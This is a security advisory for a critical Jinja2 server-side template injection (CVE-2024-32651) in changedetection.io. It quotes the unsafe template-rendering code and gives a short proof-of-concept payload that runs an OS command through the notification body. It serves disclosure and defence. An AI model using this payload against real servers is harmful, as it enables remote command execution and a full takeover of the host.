# changedetection.io has a Server Side Template Injection using Jinja2 which allows Remote Command Execution

**GHSA**: GHSA-4r7v-whpg-8rx3 | **CVE**: CVE-2024-32651 | **Severity**: critical (CVSS 10.0)

**CWE**: CWE-1336

**Affected Packages**:
- **changedetection.io** (pip): <= 0.45.20

## Description

### Summary
A Server Side Template Injection in changedetection.io caused by usage of unsafe functions of Jinja2 allows Remote Command Execution on the server host.

### Details

changedetection.io version: 0.45.20
```
docker images
REPOSITORY                            TAG       IMAGE ID       CREATED        SIZE
dgtlmoon/changedetection.io           latest    53529c2e69f1   44 hours ago   423MB
```

The vulnerability is caused by the usage of vulnerable functions of Jinja2 template engine.
```python
from jinja2 import Environment, BaseLoader
...
    # Get the notification body from datastore
    jinja2_env = Environment(loader=BaseLoader)
    n_body = jinja2_env.from_string(n_object.get('notification_body', '')).render(**notification_parameters)
    n_title = jinja2_env.from_string(n_object.get('notification_title', '')).render(**notification_parameters)
```


### PoC
1. Create/Edit a URL watch item
2. Under *Notifications* tab insert this payload: 
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
![Screenshot from 2024-04-19 15-46-04](https://github.com/dgtlmoon/changedetection.io/assets/35783570/b6a5779f-fd1e-4708-9b2d-21cb97f0bb4f)

3. See Telegram (or other supported messaging app) notification

![Screenshot from 2024-04-19 16-02-12](https://github.com/dgtlmoon/changedetection.io/assets/35783570/20877919-d6fe-49f1-bbd2-586e900207f1)


### Impact
In the PoC I've used `id` as payload and Telegram to read the result.  
Attackers can run any system command without any restriction and they don't need to read the result in the notification app (e.g. they could use a reverse shell).
The impact is critical as the attacker can completely takeover the server host.
This can be reduced if changedetection access is protected by login page with a password, but this isn't required by the application (not by default and not enforced).

### References
- https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
- https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
- https://docs.cobalt.io/bestpractices/prevent-ssti/

### Credits

Edoardo Ottavianelli
